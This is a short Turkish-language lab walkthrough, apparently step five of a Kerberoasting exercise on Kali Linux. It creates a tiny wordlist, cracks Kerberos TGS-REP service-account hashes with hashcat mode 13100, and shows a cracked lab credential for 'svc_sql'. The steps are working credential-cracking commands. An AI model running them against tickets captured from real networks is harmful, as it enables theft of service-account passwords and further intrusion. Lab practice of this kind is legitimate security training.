# 5. Hash crack fazı

**Makine: Kali**

Hashcat mode:

```text
13100 = Kerberos 5 TGS-REP etype 23
```

Lab wordlist oluştur:

```bash
cat > lab_words.txt << EOF
Password123
Password123!
UserP@ss123!
SqlP@ss123!
Spring2025!
Winter2024!
EOF
```

Crack:

```bash
hashcat -m 13100 kerberoast_svc_sql.txt lab_words.txt
```

Sonucu göster:

```bash
hashcat -m 13100 kerberoast_svc_sql.txt --show
```

Beklenen:

```text
svc_sql:SqlP@ss123!
```

Eğer tüm hash dosyasını crack edeceksen:

```bash
hashcat -m 13100 kerberoast_hashes.txt lab_words.txt
hashcat -m 13100 kerberoast_hashes.txt --show
```

